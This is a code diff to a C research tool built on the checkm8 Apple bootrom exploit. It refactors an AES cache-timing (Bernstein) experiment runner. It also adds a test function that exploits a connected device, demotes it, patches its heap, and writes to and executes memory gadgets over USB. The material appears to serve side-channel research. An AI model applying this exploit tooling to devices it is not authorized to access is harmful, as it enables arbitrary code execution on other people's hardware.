@@ -3,19 +3,18 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
-#include <math.h>
-#include <time.h>
 #include <zconf.h>
 #include <sys/stat.h>
 
 #include "dev/types.h"
 #include "dev/addr.h"
 #include "util/experiments.h"
-#include "util/host_crypto.h"
+#include "tool/usb_helpers.h"
 
 #ifdef CHECKM8_LOGGING
 #include <stdarg.h>
 #include <execinfo.h>
+
 #endif
 
 void checkm8_debug_indent(const char *format, ...)
@@ -179,9 +178,10 @@ void record_bern_data(struct bern_data *data, unsigned char *key, int index, int
 #endif
 }
 
-int main_bernstein(unsigned int num_iter, unsigned int offset)
+int main_itimed(unsigned int num_iter, unsigned int offset)
 {
     int i;
+    unsigned long long iter;
     DEV_PTR_T argbuf;
 
     struct bern_data *data;
@@ -215,9 +215,17 @@ int main_bernstein(unsigned int num_iter, unsigned int offset)
         return -1;
     }
 
+    resp = write_gadget(dev, argbuf, exp_ptrs, sizeof(struct bern_exp_ptrs));
+    if(IS_CHECKM8_FAIL(resp->ret))
+    {
+        printf("failed to write experiment pointers\n");
+        free_dev_cmd_resp(resp);
+        return -1;
+    }
+
+    free_dev_cmd_resp(resp);
     double ratio = 1.0311772745930552;
-    srand(0x69);
-    for(i = 8; i < 32; i++)
+    for(i = 0; i < 32; i++)
     {
         for(int j = 0; j < 16; j++)
             key[j] = random();
@@ -242,16 +250,24 @@ int main_bernstein(unsigned int num_iter, unsigned int offset)
         {
             printf("starting profile %i - %i iterations\n", i, curr_iter);
 
-            if(setup_payload_async(dev, PAYLOAD_AES_SW_BERN, argbuf, 5,
-                                   exp_ptrs->addr_data, exp_ptrs->addr_key,
-                                   exp_ptrs->addr_constants + offset, exp_ptrs->addr_results,
-                                   curr_iter - last_iter) == DEV_PTR_NULL)
+            iter = curr_iter - last_iter;
+            resp = write_gadget(dev, argbuf + sizeof(struct bern_exp_ptrs), &iter, sizeof(unsigned long long));
+            if(IS_CHECKM8_FAIL(resp->ret))
+            {
+                printf("failed to update number of iterations\n");
+                free_dev_cmd_resp(resp);
+                return -1;
+            }
+
+            free_dev_cmd_resp(resp);
+
+            if(async_payload_create(dev, PAYLOAD_AES_SW_BERN, argbuf) == DEV_PTR_NULL)
             {
                 printf("failed to create a new task\n");
                 return -1;
             }
 
-            if(IS_CHECKM8_FAIL(run_payload_async(dev, PAYLOAD_AES_SW_BERN)))
+            if(IS_CHECKM8_FAIL(async_payload_run(dev, PAYLOAD_AES_SW_BERN)))
             {
                 printf("failed to run async payload\n");
                 return -1;
@@ -264,7 +280,7 @@ int main_bernstein(unsigned int num_iter, unsigned int offset)
                 return -1;
             }
 
-            kill_payload_async(dev, PAYLOAD_AES_SW_BERN, 0);
+            async_payload_kill(dev, PAYLOAD_AES_SW_BERN, 0);
             record_bern_data(data, key, i, curr_iter);
             free(data);
         }
@@ -274,7 +290,36 @@ int main_bernstein(unsigned int num_iter, unsigned int offset)
     return 0;
 }
 
+int main_test_usb()
+{
+    struct pwned_device *dev = exploit_device();
+    if(dev == NULL || dev->status == DEV_NORMAL)
+    {
+        printf("Failed to exploit device\n");
+        return -1;
+    }
+
+    demote_device(dev);
+    fix_heap(dev);
+
+    unsigned char data[100];
+    memset(data, 'A', 100);
+
+    open_device_session(dev);
+
+    int retval = -1;
+    char status = 1;
+    char serial[] = "CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:0011708200D36326 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]";
+
+//    write_gadget(dev, ADDR_USB_SERIAL, serial, sizeof(serial));
+//    write_gadget(dev, ADDR_DFU_RETVAL, &retval, 4);
+    write_gadget(dev, ADDR_DFU_STATUS, &status, 1);
+    execute_gadget(dev, ADDR_EVENT_NOTIFY, 0, 1, ADDR_DFU_EVENT);
+
+    close_device_session(dev);
+}
+
 int main()
 {
-    main_bernstein(100000000, 0);
+    main_test_usb();
 }
